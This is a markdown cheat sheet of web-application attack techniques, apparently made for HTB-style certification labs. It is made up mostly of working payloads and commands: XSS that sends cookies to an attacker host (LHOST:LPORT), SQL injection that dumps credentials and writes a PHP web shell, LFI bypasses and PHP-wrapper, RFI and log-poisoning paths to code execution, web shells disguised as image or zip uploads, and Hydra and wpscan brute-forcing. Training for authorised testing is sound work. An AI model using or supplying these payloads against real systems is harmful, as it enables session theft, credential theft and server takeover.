# Enumeration
## Vhost/Subdomain
```sh
# -fs: filter length
# -fc: filter reponse code
# -r: follow redirect

# vHost
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://domain.htb -H "Host: FUZZ.domain.htb" -t 100

# subdomain
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://FUZZ.domain.htb -t 100
```

## Directory fuzzing
```sh
git clone https://github.com/reewardius/bbFuzzing.txt.git
cd bbFuzzing.txt

# -fs: filter length
# -fc: filter reponse code
# -r: follow redirect
ffuf -w bbFuzzing.txt -u http://domain.htb/FUZZ -t 100
```

# Javascript Deobfuscation
Tips:
- Try to read the javascript present on the web app, you might find something worth your time.

| **Website**                                 |
| ------------------------------------------- |
| [JS Console](https://jsconsole.com)         |
| [Prettier](https://prettier.io/playground/) |
| [Beautifier](https://beautifier.io/)        |
| [JSNice](http://www.jsnice.org/)            |
Firefox:
- Inspect -> Debugger -> js code

# XSS

## Steal cookie
When to do it?
- when you know that someone is reading what you send 
	- contact forms
	- reviews
	- user details
	- support tickets
	- user-agent header
```javascript
<script>new+Image().src="http://LHOST:LPORT/?c=".concat(encodeURI(document.cookie));</script>

<img+src=x+onerror='window.location="http://LHOST:LPORT/?c=".concat(document.cookie)'+/>
```

## Load remote script
To make a user do what inside `script.js` (ex: LFI):
```js
<script src="http://LHOST:LPORT/script.js"></script>
```

# SQLi
## Bypass login
Tips:
- Use it if confronted to login

| **Auth Bypass**    |                                 |
| ------------------ | ------------------------------- |
| `admin' or '1'='1` | Basic Auth Bypass               |
| `admin')-- -`      | Basic Auth Bypass With comments |
## Union Injection
Tips:
- Increase number of collumns untill you get an error 
- Find the reflected collumns to get the output of your payload

| **Union Injection**                                   |                                                |
| ----------------------------------------------------- | ---------------------------------------------- |
| `' order by 1-- -`                                    | Detect number of columns using `order by`      |
| `' UNION select 1,2,3-- -`                            | Detect number of columns using Union injection |
| `' UNION select 1,@@version,3,4-- -`                  | Basic Union injection                          |
| `' UNION select username, 2, 3, 4 from passwords-- -` | Union injection for 4 columns                  |
Tips:
- Enumerate the databases and the tables that are not the default one (ex: dev, users)
- List columns from those tables

| **DB Enumeration**                                                                                                        |                                            |
| ------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------ |
| `' UNION select 1,database(),2,3-- -`                                                                                     | Current database name                      |
| `' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -`                                                   | List all databases                         |
| `' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -`                  | List all tables in a specific database     |
| `' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -` | List all columns in a specific table       |
| `' UNION select 1, username, password, 4 from dev.credentials-- -`                                                        | Dump data from a table in another database |
## RCE
Tips:
- Learn what the user can do

| **Privileges**                                                                                                                           |                                   |
| ---------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------- |
| `' UNION SELECT 1, user(), 3, 4-- -`                                                                                                     | Find current user                 |
| `' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -`                                                               | Find if user has admin privileges |
| `' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -` | Find if all user privileges       |
Tips:
- Use the following to get information about the system
- Or to get RCE

|                                                                                                         |                                               |
| ------------------------------------------------------------------------------------------------------- | --------------------------------------------- |
| **File Injection**                                                                                      |                                               |
| `' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -`                                                  | Read local file                               |
| `' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -` | Write a web shell into the base web directory |
# Command Injection
Tips:
- Try to inject some of those characters when you can to see if the web application / parameter is vulnerable to it.
- Start with basic commands like `id` or `whoami` and work your way up to reach the flag

|**Injection Operator**|**Injection Character**|**URL-Encoded Character**|**Executed Command**|
|---|---|---|---|
|Semicolon|`;`|`%3b`|Both|
|New Line|`\n`|`%0a`|Both|
|Background|`&`|`%26`|Both (second output generally shown first)|
|Pipe|`\|`|`%7c`|Both (only second output is shown)|
|AND|`&&`|`%26%26`|Both (only if first succeeds)|
|OR|`\|`|`%7c%7c`|Second (only if first fails)|
|Sub-Shell|` `` `|`%60%60`|Both (Linux-only)|
|Sub-Shell|`$()`|`%24%28%29`|Both (Linux-only)|
# SSRF
Tips:
- If a service uses some kind of redirect to a url, or you see a url parameter somewhere, try some SSRF payload that redirects to your IP
- Try to read some local files as well (server conf, /etc/passwd, etc)

```sh
# open a server on your machine before
url=http://LHOST:LPORT/
# file read
url=file:///etc/passwd
```

# SSTI
Tips:
- Use this image to detect the plugin
![[CheatSheet - CBBH.png]]
- Or use SSTImap: https://github.com/vladko312/SSTImap
# Login Bruteforce
## Custom wordlists
Tips:
- Use the following tools to create custom wordlists based on the information you gather from the website
### Usernames
```sh
git clone https://github.com/urbanadventurer/username-anarchy.git
cd username-anarchy
./username-anarchy Jane Doe > usernames.txt
```
### Password
```sh
git clone https://github.com/Mebus/cupp.git
cd cupp
python3 cupp.py -i
```
## Bruteforce
Tips:
- use Hydra or Burp intruder, both works well but I prefer using Burp
```sh
# exemple with Hydra
# -l instead of -L if you already have a username
# works as well with http-get
# change the condition for failure: (ex: F=invalid credentials)
hydra -L usernames.txt -P passwords.txt <RHOST> -s <RPORT> http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect
```
# Broken Auth
## Misconfig error messages on login
TIps:
- Try to determine if you can get valid username from the error messages on login
## Weak reset password
Tips:
- Use burp intruder to fuzz the correct reset token (ex: 4 digit code)
- Or use your custom python script, work as well
## Verb Tampering
Tips:
- Change HTTP method (ex: POST -> GET, OPTIONS)

# File Inclusion
Wordlists to use in Burp Intruder:
- [LFI Wordlists](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)
- [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt)
- [Webroot path wordlist for Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt)
- [Webroot path wordlist for Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt)
- [Server configurations wordlist for Linux](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux)
- [Server configurations wordlist for Windows](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows)
## LFI
Tips:
- Whenever you have a parameter that includes a page, it is worth to try those payloads.
### Basic
```sh
/etc/passwd
../../../../etc/passwd
/../../../../etc/passwd
./languages/../../../../etc/passwd
```
### Bypasses
```sh
# replace("../","")
....//....//....//....//etc/passwd
# url encode
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
# null byte
../../../../etc/passwd%00
# php filter
php://filter/read=convert.base64-encode/resource=config
```
## RCE
### PHP wrappers
```sh
# data wrapper
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
# input wrapper
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://RHOST:RPORT/index.php?language=php://input&cmd=id"
# expect wrapper
expect://id
```
### RFI
```sh
# serve webshell on webserver
echo '<?php system($_GET["cmd"]); ?>' > shell.php && python3 -m http.server LPORT
# access webshell from web app
?language=http://LHOST:LPORT/shell.php&cmd=id
```
### Log Poisoning
Tips:
- Check which value is reflected inside the log and see how you can change it to have RCE (ex: language, username, etc)

```sh
# the file is the value of your cookie PHPSESSID
language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
# webshell
language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
# -> access it
language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
# server log w/ user agent webshell
curl -s "http://RHOST:RPORT/index.php" -A '<?php system($_GET["cmd"]); ?>'
# -> access it
language=/var/log/apache2/access.log&cmd=id
```
## Misc
Tips:
- you can fuzz it all with the already done wordlists above
- don't forget to fuzz page parameters as well, you might discover things

# File Upload
Tips:
- If the web application renames everything that you upload, it might not be exploitable.
## Web Shell
ASP
```aspx
 <% eval request('cmd') %>
```
PHP
```php
<?php system($_REQUEST['cmd']); ?>
```
## Bypasses

| **Blacklist Bypass**                                                                                                                       |                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------ | -------------------------------------------- |
| `shell.phtml`                                                                                                                              | Uncommon Extension                           |
| `shell.pHp`                                                                                                                                | Case Manipulation                            |
| [PHP Extensions](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst) | List of PHP Extensions                       |
| [ASP Extensions](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP)                | List of ASP Extensions                       |
| [Web Extensions](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt)                          | List of Web Extensions                       |
| **Whitelist Bypass**                                                                                                                       |                                              |
| `shell.jpg.php`                                                                                                                            | Double Extension                             |
| `shell.php.jpg`                                                                                                                            | Reverse Double Extension                     |
| `%20`, `%0a`, `%00`, `%0d0a`, `/`, `.\`, `.`, `…`                                                                                          | Character Injection - Before/After Extension |
| **Content/Type Bypass**                                                                                                                    |                                              |
| [Web Content-Types](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt)                             | List of Web Content-Types                    |
| [Content-Types](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt)                    | List of All Content-Types                    |
| [File Signatures](https://en.wikipedia.org/wiki/List_of_file_signatures)                                                                   | List of File Signatures/Magic Bytes          |
## LFI combine with File Upload

|                                                                                |                                       |
| ------------------------------------------------------------------------------ | ------------------------------------- |
| **LFI + Upload**                                                               |                                       |
| `echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif`                        | Create malicious image                |
| `/index.php?language=./profile_images/shell.gif&cmd=id`                        | RCE with malicious uploaded image     |
| `echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php` | Create malicious zip archive 'as jpg' |
| `/index.php?language=zip://shell.zip%23shell.php&cmd=id`                       | RCE with malicious uploaded zip       |
| `php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg`            | Create malicious phar 'as jpg'        |
| `/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id`     | RCE with malicious uploaded phar      |

## Limited Uploads

|**Potential Attack**|**File Types**|
|---|---|
|`XSS`|HTML, JS, SVG, GIF|
|`XXE`/`SSRF`|XML, SVG, PDF, PPT, DOC|

# Web Service & API Attacks
Tips:
- Look for javascript code if API is there
	- find all endpoints and which parameters are required
	- look for url parameter -> SSRF
	- try command injection as well
	- try IDOR (fuzzing id parameter for example)
# Wordpress
Tips:
- look for vulnerable plugin / theme
	- insert php shell inside 404.php page
```sh
# scan wordpress
wpscan --api-token $TOKEN --url http://RHOST:RPORT/

# bruteforce password
wpscan --password-attack xmlrpc -t 20 -U admin -P passwords.txt --url http://RHOST:RPORT/
```
 